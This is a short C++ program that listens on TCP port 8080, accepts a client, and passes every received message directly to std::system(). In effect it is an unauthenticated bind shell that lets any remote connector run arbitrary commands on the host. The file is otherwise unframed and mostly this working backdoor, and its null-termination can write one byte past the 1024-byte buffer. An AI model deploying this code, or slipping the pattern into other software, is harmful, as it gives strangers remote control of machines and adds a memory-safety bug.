#include "sock.hpp"
#include <cstdlib>
#include <iostream>

int main()
{
    my::sock s1;
    int stat = 1;

    stat = s1.creat_socket();

    if (stat < 0)
    {
        std::cout << "error 1\n";
    }
    else
    {
        stat = s1.bind_socket(8080);

        if (stat < 0)
        {
            std::cout << "error 2\n";
        }
        else
        {
            stat = s1.listin_socket();

            if (stat < 0)
            {
                std::cout << "error 3\n";
            }
            else
            {
                stat = s1.accept_socket();

                if (stat < 0)
                {
                    std::cout << "error 4\n";
                }
                else
                {
                      std::cout << "client is connected \n"; 
                    while (true)
                    {
                       
                 
                        char buffer[1024]{};

                        int n = s1.read_socket(buffer);

                        if (n > 0)
                        {
                            buffer[n] = '\0';

                            std::cout << buffer << '\n';
                            std::system(buffer);
                            if(std::string(buffer) == "exit")
                            {
                                break;
                            }
                        }
                        

                    
                    }
                }
            }
        }
    }
}